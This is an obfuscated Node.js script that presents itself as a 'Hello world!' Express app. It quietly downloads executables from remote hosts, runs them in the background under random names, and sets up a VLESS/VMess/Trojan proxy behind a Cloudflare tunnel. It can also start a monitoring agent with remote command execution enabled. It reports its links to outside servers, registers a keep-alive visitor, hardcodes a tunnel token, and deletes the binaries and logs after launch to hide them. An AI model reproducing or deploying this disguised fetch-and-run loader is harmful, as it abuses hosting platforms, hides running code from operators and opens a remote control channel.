const _0x3529f1=_0x1d2a;function _0x2ca0(){const _0x2ed6d7=['https://amd64.ssss.nyc.mn/agent','firefox','env','log','send','list.txt','\x20>/dev/null\x202>&1','unlink','Unhandled\x20error\x20in\x20startserver:','&path=%2Ftrojan-argo%3Fed%3D2560#','match','Content-Type','https://arm64.ssss.nyc.mn/bot','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','rm\x20-rf\x20','createWriteStream','basename','NEZHA_PORT','quic','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','readFileSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','all','tcp','clear','ArgoDomain:','child_process','join','2083','\x20>\x20nul\x202>&1','SERVER_PORT','2SxCPAy','Skipping\x20adding\x20automatic\x20access\x20task','\x20is\x20created','floor','https://arm64.ssss.nyc.mn/agent','readdirSync','false','Error\x20in\x20startserver:','Hello\x20world!','org','vmess','stream','filter','16qwhfTY','2053','arm64','3630ltqDYv','2096','\x20failed:\x20','boot.log','then','pkill\x20-f\x20\x22[','utf-8','http','charAt','\x0a\x20\x20credentials-file:\x20','/vmess-argo','trojan','?security=tls&sni=','?encryption=none&security=tls&sni=','tunnel.json','finish','aarch64','9385NUWtqv','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','true','platform','TunnelSecret','substring','http://ip-api.com/json/','chmod','automatic\x20access\x20task\x20added\x20successfully','ARGO_DOMAIN:','NAME','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/tunnel.yml\x20run','php\x20running\x20error:\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','abcdefghijklmnopqrstuvwxyz','unlinkSync','express','countryCode','fileUrl','application/json','\x20-s\x20','stringify','tls','https://amd64.ssss.nyc.mn/web','data','\x20>/dev/null\x202>&1\x20&','test','pipe','block','message','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','taskkill\x20/f\x20/im\x20','\x0aclient_secret:\x20','\x0a\x20\x20tunnel:\x20','UUID','catch','forEach','ARGO_DOMAIN','CFPORT','xtls-rprx-vision','exec','vless','1957192oEBOkQ','Subscription\x20uploaded\x20successfully','/api/delete-nodes','App\x20is\x20running','Error\x20reading\x20boot.log:','random','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','path','post','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','base64','95c4ce5c-a72a-4713-ab9d-4dee482ef780','fileName','sub.txt','6029121plEZUZ','Download\x20','writeFileSync','text/plain;\x20charset=utf-8','443','config.yaml','/sub.txt\x20saved\x20successfully','config.json','2065419xWTRHz','unshift','29633820xixsTh','arm','/api/add-nodes','Nodes\x20uploaded\x20successfully','web\x20running\x20error:\x20','status','\x20is\x20running','nohup\x20','https://arm64.ssss.nyc.mn/v1','/dev/null','axios','existsSync','from','848745EqGpjH','set','NEZHA_KEY','freedom','8443','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','response','split','1042020cRYTmt','&fp=firefox&type=ws&host=','toString','isFile','Empowerment\x20failed\x20for\x20','2087','arch','Error\x20executing\x20command:\x20','Empowerment\x20success\x20for\x20','ARGO_AUTH','--tls','SUB_PATH','/vless-argo','close','length','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','eyJhIjoiNWNhNDE3M2M4YzFkMWVkZGIyNGQzNDdiM2IzMGZjM2UiLCJ0IjoiNzQ3ZTA0M2UtNDg5OC00OTIzLThkNWMtNzRiMGNhYTA5MjllIiwicyI6IlpXRmhNemsxWkRZdE1tUTBNUzAwTWpNMExXRmpNR1F0WkRSak1qUTFaV1k0T0dKaiJ9','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','win32','get','error','memory0123.memorytestgame.com','.exe\x20>\x20nul\x202>&1','PROJECT_URL','Error\x20downloading\x20files:','Unknown','\x0avless://','none','map','del\x20/f\x20/q\x20','/trojan-argo','UPLOAD_URL','\x20already\x20exists','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','ARGO_PORT','push','direct','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','127.0.0.1','util','Add\x20automatic\x20access\x20task\x20faild:\x20','https://ipapi.co/json/','includes','AUTO_ACCESS'];_0x2ca0=function(){return _0x2ed6d7;};return _0x2ca0();}(function(_0x368f1b,_0x44c864){const _0x55f1f1=_0x1d2a,_0x34d85b=_0x368f1b();while(!![]){try{const _0x5963dc=parseInt(_0x55f1f1(0x119))/0x1*(-parseInt(_0x55f1f1(0xcd))/0x2)+-parseInt(_0x55f1f1(0xc5))/0x3+parseInt(_0x55f1f1(0xa0))/0x4+parseInt(_0x55f1f1(0x13a))/0x5*(-parseInt(_0x55f1f1(0x129))/0x6)+-parseInt(_0x55f1f1(0xae))/0x7+-parseInt(_0x55f1f1(0x126))/0x8*(-parseInt(_0x55f1f1(0xb6))/0x9)+parseInt(_0x55f1f1(0xb8))/0xa;if(_0x5963dc===_0x44c864)break;else _0x34d85b['push'](_0x34d85b['shift']());}catch(_0x3b8574){_0x34d85b['push'](_0x34d85b['shift']());}}}(_0x2ca0,0x9000f));const express=require(_0x3529f1(0x14b)),app=express(),axios=require(_0x3529f1(0xc2)),os=require('os'),fs=require('fs'),path=require(_0x3529f1(0xa7)),{promisify}=require(_0x3529f1(0xf4)),exec=promisify(require(_0x3529f1(0x114))[_0x3529f1(0x9e)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x3529f1(0xfb)][_0x3529f1(0xec)]||'',PROJECT_URL=process['env'][_0x3529f1(0xe4)]||'',AUTO_ACCESS=process['env'][_0x3529f1(0xf8)]||![],FILE_PATH=process[_0x3529f1(0xfb)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x3529f1(0xfb)][_0x3529f1(0xd8)]||'sub',PORT=process['env'][_0x3529f1(0x118)]||process['env']['PORT']||0xbb8,UUID=process[_0x3529f1(0xfb)][_0x3529f1(0x15d)]||_0x3529f1(0xab),NEZHA_SERVER=process[_0x3529f1(0xfb)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3529f1(0xfb)][_0x3529f1(0x10b)]||'',NEZHA_KEY=process[_0x3529f1(0xfb)][_0x3529f1(0xc7)]||'',ARGO_DOMAIN=process['env'][_0x3529f1(0x160)]||_0x3529f1(0xe2),ARGO_AUTH=process['env'][_0x3529f1(0xd6)]||_0x3529f1(0xdd),ARGO_PORT=process['env'][_0x3529f1(0xef)]||0x1f41,CFIP=process[_0x3529f1(0xfb)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x3529f1(0xfb)][_0x3529f1(0x9c)]||0x1bb,NAME=process['env'][_0x3529f1(0x144)]||'memory0123';!fs[_0x3529f1(0xc3)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x3529f1(0xfc)](FILE_PATH+_0x3529f1(0x11b))):console['log'](FILE_PATH+_0x3529f1(0xed));function generateRandomName(){const _0x2f697f=_0x3529f1,_0x1d785c=_0x2f697f(0x149);let _0x24452c='';for(let _0x3a5f7e=0x0;_0x3a5f7e<0x6;_0x3a5f7e++){_0x24452c+=_0x1d785c[_0x2f697f(0x131)](Math[_0x2f697f(0x11c)](Math[_0x2f697f(0xa5)]()*_0x1d785c[_0x2f697f(0xdb)]));}return _0x24452c;}function _0x1d2a(_0x5629b8,_0x4bf31f){_0x5629b8=_0x5629b8-0x9c;const _0x2ca011=_0x2ca0();let _0x1d2a5d=_0x2ca011[_0x5629b8];return _0x1d2a5d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3529f1(0x115)](FILE_PATH,npmName),phpPath=path[_0x3529f1(0x115)](FILE_PATH,phpName),webPath=path[_0x3529f1(0x115)](FILE_PATH,webName),botPath=path[_0x3529f1(0x115)](FILE_PATH,botName),subPath=path[_0x3529f1(0x115)](FILE_PATH,_0x3529f1(0xad)),listPath=path['join'](FILE_PATH,_0x3529f1(0xfe)),bootLogPath=path['join'](FILE_PATH,_0x3529f1(0x12c)),configPath=path[_0x3529f1(0x115)](FILE_PATH,_0x3529f1(0xb5));function deleteNodes(){const _0x19787d=_0x3529f1;try{if(!UPLOAD_URL)return;if(!fs[_0x19787d(0xc3)](subPath))return;let _0xfa8a31;try{_0xfa8a31=fs['readFileSync'](subPath,_0x19787d(0x12f));}catch{return null;}const _0x19443f=Buffer[_0x19787d(0xc4)](_0xfa8a31,_0x19787d(0xaa))[_0x19787d(0xcf)](_0x19787d(0x12f)),_0x3863ac=_0x19443f[_0x19787d(0xcc)]('\x0a')[_0x19787d(0x125)](_0x271b99=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x19787d(0x155)](_0x271b99));if(_0x3863ac[_0x19787d(0xdb)]===0x0)return;return axios[_0x19787d(0xa8)](UPLOAD_URL+_0x19787d(0xa2),JSON[_0x19787d(0x150)]({'nodes':_0x3863ac}),{'headers':{'Content-Type':_0x19787d(0x14e)}})['catch'](_0x474c9f=>{return null;}),null;}catch(_0x3d0e94){return null;}}function cleanupOldFiles(){const _0x129b24=_0x3529f1;try{const _0x55c1ce=fs[_0x129b24(0x11e)](FILE_PATH);_0x55c1ce[_0x129b24(0x15f)](_0x3d400f=>{const _0x51bc11=_0x129b24,_0x416e75=path[_0x51bc11(0x115)](FILE_PATH,_0x3d400f);try{const _0x2a2517=fs['statSync'](_0x416e75);_0x2a2517[_0x51bc11(0xd0)]()&&fs[_0x51bc11(0x14a)](_0x416e75);}catch(_0x57cfcd){}});}catch(_0x32e93c){}}app[_0x3529f1(0xe0)]('/',function(_0x4e6192,_0x450d9c){const _0x588198=_0x3529f1;_0x450d9c[_0x588198(0xfd)](_0x588198(0x121));});async function generateConfig(){const _0x8d9561=_0x3529f1,_0x2f44ac={'log':{'access':'/dev/null','error':_0x8d9561(0xc1),'loglevel':_0x8d9561(0xe8)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x8d9561(0x9d)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x8d9561(0xd9),'dest':0xbba},{'path':_0x8d9561(0x133),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x8d9561(0x111)}},{'port':0xbb9,'listen':_0x8d9561(0xf3),'protocol':_0x8d9561(0x9f),'settings':{'clients':[{'id':UUID}],'decryption':_0x8d9561(0xe8)},'streamSettings':{'network':_0x8d9561(0x111),'security':_0x8d9561(0xe8)}},{'port':0xbba,'listen':_0x8d9561(0xf3),'protocol':_0x8d9561(0x9f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x8d9561(0xe8)},'streamSettings':{'network':'ws','security':_0x8d9561(0xe8),'wsSettings':{'path':_0x8d9561(0xd9)}},'sniffing':{'enabled':!![],'destOverride':[_0x8d9561(0x130),_0x8d9561(0x151),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x8d9561(0x123),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x8d9561(0x133)}},'sniffing':{'enabled':!![],'destOverride':[_0x8d9561(0x130),_0x8d9561(0x151),_0x8d9561(0x10c)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x8d9561(0xf3),'protocol':_0x8d9561(0x134),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x8d9561(0xe8),'wsSettings':{'path':_0x8d9561(0xeb)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x8d9561(0x151),_0x8d9561(0x10c)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x8d9561(0xc8),'tag':_0x8d9561(0xf1)},{'protocol':'blackhole','tag':_0x8d9561(0x157)}]};fs[_0x8d9561(0xb0)](path['join'](FILE_PATH,'config.json'),JSON['stringify'](_0x2f44ac,null,0x2));}function getSystemArchitecture(){const _0x5375b7=_0x3529f1,_0x247a36=os[_0x5375b7(0xd3)]();return _0x247a36===_0x5375b7(0xb9)||_0x247a36===_0x5375b7(0x128)||_0x247a36===_0x5375b7(0x139)?'arm':'amd';}function downloadFile(_0x46509f,_0x59de55,_0xe742e){const _0x275a56=_0x3529f1,_0x436527=_0x46509f;!fs[_0x275a56(0xc3)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x496ba2=fs[_0x275a56(0x109)](_0x436527);axios({'method':'get','url':_0x59de55,'responseType':_0x275a56(0x124)})[_0x275a56(0x12d)](_0x20e783=>{const _0x582596=_0x275a56;_0x20e783[_0x582596(0x153)][_0x582596(0x156)](_0x496ba2),_0x496ba2['on'](_0x582596(0x138),()=>{const _0x1a0dcc=_0x582596;_0x496ba2[_0x1a0dcc(0xda)](),console[_0x1a0dcc(0xfc)](_0x1a0dcc(0xaf)+path[_0x1a0dcc(0x10a)](_0x436527)+'\x20successfully'),_0xe742e(null,_0x436527);}),_0x496ba2['on'](_0x582596(0xe1),_0x3a485b=>{const _0x3a8a40=_0x582596;fs[_0x3a8a40(0x100)](_0x436527,()=>{});const _0x2e25fa=_0x3a8a40(0xaf)+path[_0x3a8a40(0x10a)](_0x436527)+_0x3a8a40(0x12b)+_0x3a485b[_0x3a8a40(0x158)];console[_0x3a8a40(0xe1)](_0x2e25fa),_0xe742e(_0x2e25fa);});})[_0x275a56(0x15e)](_0x2f6fd4=>{const _0x48513c=_0x275a56,_0x256c21=_0x48513c(0xaf)+path[_0x48513c(0x10a)](_0x436527)+_0x48513c(0x12b)+_0x2f6fd4[_0x48513c(0x158)];console[_0x48513c(0xe1)](_0x256c21),_0xe742e(_0x256c21);});}async function downloadFilesAndRun(){const _0x5d1f21=_0x3529f1,_0x396bb1=getSystemArchitecture(),_0x242ec5=getFilesForArchitecture(_0x396bb1);if(_0x242ec5['length']===0x0){console[_0x5d1f21(0xfc)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x181ba0=_0x242ec5[_0x5d1f21(0xe9)](_0x2cd5e1=>{return new Promise((_0x2a0041,_0x25899d)=>{const _0x15508e=_0x1d2a;downloadFile(_0x2cd5e1[_0x15508e(0xac)],_0x2cd5e1[_0x15508e(0x14d)],(_0x1bb57f,_0x36cfee)=>{_0x1bb57f?_0x25899d(_0x1bb57f):_0x2a0041(_0x36cfee);});});});try{await Promise[_0x5d1f21(0x110)](_0x181ba0);}catch(_0x5e74f6){console[_0x5d1f21(0xe1)](_0x5d1f21(0xe5),_0x5e74f6);return;}function _0x40e673(_0x15ce7b){const _0x39ff17=_0x5d1f21,_0x34990d=0x1fd;_0x15ce7b[_0x39ff17(0x15f)](_0x22f45f=>{const _0x16c206=_0x39ff17;fs[_0x16c206(0xc3)](_0x22f45f)&&fs[_0x16c206(0x141)](_0x22f45f,_0x34990d,_0x2d339e=>{const _0x357492=_0x16c206;_0x2d339e?console[_0x357492(0xe1)](_0x357492(0xd1)+_0x22f45f+':\x20'+_0x2d339e):console[_0x357492(0xfc)](_0x357492(0xd5)+_0x22f45f+':\x20'+_0x34990d[_0x357492(0xcf)](0x8));});});}const _0x54312b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x40e673(_0x54312b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x100849=NEZHA_SERVER[_0x5d1f21(0xf7)](':')?NEZHA_SERVER[_0x5d1f21(0xcc)](':')['pop']():'',_0x208d00=new Set(['443',_0x5d1f21(0xc9),_0x5d1f21(0x12a),'2087',_0x5d1f21(0x116),_0x5d1f21(0x127)]),_0x15ab8b=_0x208d00['has'](_0x100849)?_0x5d1f21(0x13c):_0x5d1f21(0x11f),_0x491703=_0x5d1f21(0x15b)+NEZHA_KEY+_0x5d1f21(0xf2)+NEZHA_SERVER+_0x5d1f21(0x10d)+_0x15ab8b+_0x5d1f21(0xa6)+UUID;fs[_0x5d1f21(0xb0)](path[_0x5d1f21(0x115)](FILE_PATH,_0x5d1f21(0xb3)),_0x491703);const _0x1552b5='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x5d1f21(0xa9);try{await exec(_0x1552b5),console['log'](phpName+_0x5d1f21(0xbe)),await new Promise(_0x5ac049=>setTimeout(_0x5ac049,0x3e8));}catch(_0x527194){console[_0x5d1f21(0xe1)](_0x5d1f21(0x147)+_0x527194);}}else{let _0x1ff815='';const _0x2a2079=[_0x5d1f21(0xb2),_0x5d1f21(0xc9),'2096',_0x5d1f21(0xd2),_0x5d1f21(0x116),_0x5d1f21(0x127)];_0x2a2079['includes'](NEZHA_PORT)&&(_0x1ff815=_0x5d1f21(0xd7));const _0x43771b=_0x5d1f21(0xbf)+npmPath+_0x5d1f21(0x14f)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1ff815+_0x5d1f21(0xca);try{await exec(_0x43771b),console[_0x5d1f21(0xfc)](npmName+_0x5d1f21(0xbe)),await new Promise(_0x490501=>setTimeout(_0x490501,0x3e8));}catch(_0x2b231b){console[_0x5d1f21(0xe1)]('npm\x20running\x20error:\x20'+_0x2b231b);}}}else console[_0x5d1f21(0xfc)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x98bc10=_0x5d1f21(0xbf)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x98bc10),console[_0x5d1f21(0xfc)](webName+_0x5d1f21(0xbe)),await new Promise(_0xd69a2a=>setTimeout(_0xd69a2a,0x3e8));}catch(_0x1c624f){console['error'](_0x5d1f21(0xbc)+_0x1c624f);}if(fs[_0x5d1f21(0xc3)](botPath)){let _0x401605;if(ARGO_AUTH[_0x5d1f21(0x103)](/^[A-Z0-9a-z=]{120,250}$/))_0x401605=_0x5d1f21(0x10f)+ARGO_AUTH;else ARGO_AUTH[_0x5d1f21(0x103)](/TunnelSecret/)?_0x401605=_0x5d1f21(0x159)+FILE_PATH+_0x5d1f21(0x146):_0x401605=_0x5d1f21(0xde)+FILE_PATH+_0x5d1f21(0x145)+ARGO_PORT;try{await exec(_0x5d1f21(0xbf)+botPath+'\x20'+_0x401605+'\x20>/dev/null\x202>&1\x20&'),console[_0x5d1f21(0xfc)](botName+'\x20is\x20running'),await new Promise(_0x2d5e3a=>setTimeout(_0x2d5e3a,0x7d0));}catch(_0x366bfa){console[_0x5d1f21(0xe1)](_0x5d1f21(0xd4)+_0x366bfa);}}await new Promise(_0x48cea8=>setTimeout(_0x48cea8,0x1388));}function getFilesForArchitecture(_0x270608){const _0x2e773a=_0x3529f1;let _0x51824f;_0x270608===_0x2e773a(0xb9)?_0x51824f=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x2e773a(0x105)}]:_0x51824f=[{'fileName':webPath,'fileUrl':_0x2e773a(0x152)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x339294=_0x270608===_0x2e773a(0xb9)?_0x2e773a(0x11d):_0x2e773a(0xf9);_0x51824f[_0x2e773a(0xb7)]({'fileName':npmPath,'fileUrl':_0x339294});}else{const _0x5e210f=_0x270608===_0x2e773a(0xb9)?_0x2e773a(0xc0):'https://amd64.ssss.nyc.mn/v1';_0x51824f[_0x2e773a(0xb7)]({'fileName':phpPath,'fileUrl':_0x5e210f});}}return _0x51824f;}function argoType(){const _0x182453=_0x3529f1;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x182453(0xfc)](_0x182453(0x106));return;}if(ARGO_AUTH['includes'](_0x182453(0x13e))){fs[_0x182453(0xb0)](path['join'](FILE_PATH,_0x182453(0x137)),ARGO_AUTH);const _0x6e18d4=_0x182453(0x15c)+ARGO_AUTH[_0x182453(0xcc)]('\x22')[0xb]+_0x182453(0x132)+path[_0x182453(0x115)](FILE_PATH,_0x182453(0x137))+_0x182453(0xdc)+ARGO_DOMAIN+_0x182453(0x13b)+ARGO_PORT+_0x182453(0x107);fs[_0x182453(0xb0)](path[_0x182453(0x115)](FILE_PATH,'tunnel.yml'),_0x6e18d4);}else console['log'](_0x182453(0xee));}async function extractDomains(){const _0x325dba=_0x3529f1;let _0x1c7b82;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1c7b82=ARGO_DOMAIN,console['log'](_0x325dba(0x143),_0x1c7b82),await _0x575606(_0x1c7b82);else try{const _0x1dc6da=fs[_0x325dba(0x10e)](path['join'](FILE_PATH,_0x325dba(0x12c)),'utf-8'),_0x319920=_0x1dc6da['split']('\x0a'),_0x292882=[];_0x319920['forEach'](_0x3e5a01=>{const _0x5330a5=_0x325dba,_0x4497b2=_0x3e5a01[_0x5330a5(0x103)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4497b2){const _0x21e852=_0x4497b2[0x1];_0x292882[_0x5330a5(0xf0)](_0x21e852);}});if(_0x292882[_0x325dba(0xdb)]>0x0)_0x1c7b82=_0x292882[0x0],console['log'](_0x325dba(0x113),_0x1c7b82),await _0x575606(_0x1c7b82);else{console[_0x325dba(0xfc)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x325dba(0x14a)](path[_0x325dba(0x115)](FILE_PATH,_0x325dba(0x12c)));async function _0x7b788(){const _0x16e187=_0x325dba;try{process[_0x16e187(0x13d)]===_0x16e187(0xdf)?await exec(_0x16e187(0x15a)+botName+_0x16e187(0xe3)):await exec(_0x16e187(0x12e)+botName['charAt'](0x0)+']'+botName[_0x16e187(0x13f)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3a88b8){}}_0x7b788(),await new Promise(_0x5aa4e2=>setTimeout(_0x5aa4e2,0xbb8));const _0x506680='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x325dba(0xbf)+botPath+'\x20'+_0x506680+_0x325dba(0x154)),console['log'](botName+_0x325dba(0xbe)),await new Promise(_0x5687ba=>setTimeout(_0x5687ba,0xbb8)),await extractDomains();}catch(_0x2be4a7){console[_0x325dba(0xe1)](_0x325dba(0xd4)+_0x2be4a7);}}}catch(_0x44af8e){console[_0x325dba(0xe1)](_0x325dba(0xa4),_0x44af8e);}async function _0x5f1cf8(){const _0x4644b9=_0x325dba;try{const _0x5af59=await axios[_0x4644b9(0xe0)](_0x4644b9(0xf6),{'timeout':0xbb8});if(_0x5af59[_0x4644b9(0x153)]&&_0x5af59['data']['country_code']&&_0x5af59[_0x4644b9(0x153)]['org'])return _0x5af59['data']['country_code']+'_'+_0x5af59[_0x4644b9(0x153)][_0x4644b9(0x122)];}catch(_0x115537){try{const _0x493979=await axios[_0x4644b9(0xe0)](_0x4644b9(0x140),{'timeout':0xbb8});if(_0x493979['data']&&_0x493979[_0x4644b9(0x153)][_0x4644b9(0xbd)]==='success'&&_0x493979[_0x4644b9(0x153)][_0x4644b9(0x14c)]&&_0x493979[_0x4644b9(0x153)][_0x4644b9(0x122)])return _0x493979[_0x4644b9(0x153)][_0x4644b9(0x14c)]+'_'+_0x493979['data'][_0x4644b9(0x122)];}catch(_0xc363de){}}return _0x4644b9(0xe6);}async function _0x575606(_0x7b062a){const _0x57d912=await _0x5f1cf8(),_0x2c3cd9=NAME?NAME+'-'+_0x57d912:_0x57d912;return new Promise(_0x22dd76=>{setTimeout(()=>{const _0x379eac=_0x1d2a,_0x49f974={'v':'2','ps':''+_0x2c3cd9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x379eac(0xe8),'host':_0x7b062a,'path':'/vmess-argo?ed=2560','tls':_0x379eac(0x151),'sni':_0x7b062a,'alpn':'','fp':_0x379eac(0xfa)},_0x563c20=_0x379eac(0xe7)+UUID+'@'+CFIP+':'+CFPORT+_0x379eac(0x136)+_0x7b062a+_0x379eac(0xce)+_0x7b062a+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2c3cd9+'\x0a\x0avmess://'+Buffer[_0x379eac(0xc4)](JSON[_0x379eac(0x150)](_0x49f974))['toString'](_0x379eac(0xaa))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x379eac(0x135)+_0x7b062a+'&fp=firefox&type=ws&host='+_0x7b062a+_0x379eac(0x102)+_0x2c3cd9+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](_0x563c20)['toString'](_0x379eac(0xaa))),fs[_0x379eac(0xb0)](subPath,Buffer[_0x379eac(0xc4)](_0x563c20)[_0x379eac(0xcf)](_0x379eac(0xaa))),console['log'](FILE_PATH+_0x379eac(0xb4)),uploadNodes(),app[_0x379eac(0xe0)]('/'+SUB_PATH,(_0xba191a,_0x356396)=>{const _0x53e0a2=_0x379eac,_0x54d0ce=Buffer['from'](_0x563c20)['toString'](_0x53e0a2(0xaa));_0x356396[_0x53e0a2(0xc6)](_0x53e0a2(0x104),_0x53e0a2(0xb1)),_0x356396[_0x53e0a2(0xfd)](_0x54d0ce);}),_0x22dd76(_0x563c20);},0x7d0);});}}async function uploadNodes(){const _0x397dc6=_0x3529f1;if(UPLOAD_URL&&PROJECT_URL){const _0x4b226b=PROJECT_URL+'/'+SUB_PATH,_0x2d314c={'subscription':[_0x4b226b]};try{const _0x53245b=await axios[_0x397dc6(0xa8)](UPLOAD_URL+'/api/add-subscriptions',_0x2d314c,{'headers':{'Content-Type':'application/json'}});return _0x53245b&&_0x53245b[_0x397dc6(0xbd)]===0xc8?(console[_0x397dc6(0xfc)](_0x397dc6(0xa1)),_0x53245b):null;}catch(_0x23557b){if(_0x23557b['response']){if(_0x23557b[_0x397dc6(0xcb)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x397dc6(0xc3)](listPath))return;const _0x45fe88=fs[_0x397dc6(0x10e)](listPath,'utf-8'),_0x364f04=_0x45fe88[_0x397dc6(0xcc)]('\x0a')[_0x397dc6(0x125)](_0x4833a5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x397dc6(0x155)](_0x4833a5));if(_0x364f04[_0x397dc6(0xdb)]===0x0)return;const _0x301514=JSON[_0x397dc6(0x150)]({'nodes':_0x364f04});try{const _0x5b2bef=await axios['post'](UPLOAD_URL+_0x397dc6(0xba),_0x301514,{'headers':{'Content-Type':_0x397dc6(0x14e)}});return _0x5b2bef&&_0x5b2bef[_0x397dc6(0xbd)]===0xc8?(console['log'](_0x397dc6(0xbb)),_0x5b2bef):null;}catch(_0x5d625b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x152b94=_0x1d2a,_0x40ad8a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x40ad8a[_0x152b94(0xf0)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x40ad8a['push'](phpPath);process[_0x152b94(0x13d)]===_0x152b94(0xdf)?exec(_0x152b94(0xea)+_0x40ad8a[_0x152b94(0x115)]('\x20')+_0x152b94(0x117),_0x4ec63c=>{const _0x3dcd11=_0x152b94;console[_0x3dcd11(0x112)](),console['log'](_0x3dcd11(0xa3)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x152b94(0x108)+_0x40ad8a['join']('\x20')+_0x152b94(0xff),_0x2265f4=>{const _0xdbf4a4=_0x152b94;console[_0xdbf4a4(0x112)](),console[_0xdbf4a4(0xfc)]('App\x20is\x20running'),console['log'](_0xdbf4a4(0x148));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2bf598=_0x3529f1;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x2bf598(0x11a));return;}try{const _0x24ed57=await axios[_0x2bf598(0xa8)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x2bf598(0x142)),_0x24ed57;}catch(_0x4b94dd){return console[_0x2bf598(0xe1)](_0x2bf598(0xf5)+_0x4b94dd['message']),null;}}async function startserver(){const _0x48236a=_0x3529f1;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2a6fa4){console[_0x48236a(0xe1)](_0x48236a(0x120),_0x2a6fa4);}}startserver()[_0x3529f1(0x15e)](_0x3013c3=>{const _0x1b3991=_0x3529f1;console[_0x1b3991(0xe1)](_0x1b3991(0x101),_0x3013c3);}),app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
